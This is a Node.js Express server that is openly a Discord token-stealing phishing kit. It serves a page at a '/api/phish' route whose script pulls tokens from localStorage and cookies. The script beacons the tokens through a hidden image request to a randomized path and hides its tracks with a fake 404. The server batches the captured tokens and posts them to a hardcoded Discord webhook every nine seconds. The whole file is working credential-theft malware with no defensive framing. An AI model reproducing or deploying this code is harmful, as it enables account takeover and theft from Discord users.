const express = require('express');  
const crypto = require('crypto');  
const axios = require('axios');  
const app = express();  

// CONFIGURE WARHEAD (HARDCODED FOR ZERO-SETUP)  
const WEBHOOK = "https://discord.com/api/webhooks/1352354085483053156/_mJb7zszAZ5ogi2Sxurfw6gYoECgIVMKdR7EDLO_jpbUhHmVWR2S6H2v4fxTMA98CbLw";  
const TOKEN_REGEX = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/;  

class PhantomCore {  
  constructor() {  
    this.tokens = [];  
    this.exfilPath = `/pixel_${crypto.randomBytes(3).toString('hex')}`;  
    this.init();  
  }  

  init() {  
    // Auto-exfil every 9 seconds  
    setInterval(() => this.flushTokens(), 9000);  
    
    // Randomize endpoint on restart  
    this.exfilPath = `/pixel_${crypto.randomBytes(3).toString('hex')}`;  
  }  

  generatePayload() {  
    return `<!DOCTYPE html>  
<html>  
<head>  
  <script>  
    // STAGE 1: TOKEN HARVESTING  
    const vacuumTokens = () => {  
      const loot = {  
        localStorage: localStorage.token,  
        cookies: document.cookie.match(/token=([^;]+)/)?.[1],  
        discordInternals: window.webpackChunkdiscord_app ? "CHUNK_ACTIVE" : null  
      };  

      // STAGE 2: STEALTH EXFIL  
      Object.values(loot).forEach(token => {  
        if(${TOKEN_REGEX.toString()}.test(token)) {  
          const img = new Image();  
          img.src = \`${this.exfilPath}?d=\${btoa(token)  
            .replace(/=/g, '')  
            .replace(/\\+/g, '-')  
            .replace(/\\//g, '_')}\`;  
        }  
      });  

      // STAGE 3: DESTROY EVIDENCE  
      window.stop();  
      document.body.innerHTML = '<h1>404 Not Found</h1>';  
    };  

    // TRIGGER MECHANISMS  
    window.addEventListener('load', vacuumTokens);  
    window.addEventListener('beforeunload', vacuumTokens);  
    setTimeout(vacuumTokens, 250);  
  </script>  
</head>  
<body></body>  
</html>`;  
  }  

  async flushTokens() {  
    if(this.tokens.length === 0) return;  

    // WEBHOOK FORMATTING  
    const embeds = this.tokens.map(token => ({  
      title: "LIVE TOKEN CAPTURE",  
      description: \`\`\`  
        ${token}  
        \`\`\`,  
      color: 0xFF0000  
    }));  

    await axios.post(WEBHOOK, {  
      content: "🔥 PHANTOM STRIKE SUCCESS 🔥",  
      embeds  
    }).catch(() => {});  

    this.tokens = [];  
  }  
}  

const phantom = new PhantomCore();  

// MAIN PHISHING ENDPOINT  
app.get('/api/phish', (req, res) => {  
  res.send(phantom.generatePayload());  
});  

// STEALTH EXFIL ROUTE  
app.get(phantom.exfilPath, (req, res) => {  
  try {  
    const data = req.query.d || '';  
    const token = Buffer.from(data, 'base64').toString();  
    if(TOKEN_REGEX.test(token)) {  
      phantom.tokens.push(token);  
    }  
  } catch {}  
  res.sendStatus(204);  
});  


app.get('/nuke', () => process.exit(0));  


app.use((req, res) => res.status(404).send('Not Found'));  

module.exports = app;  
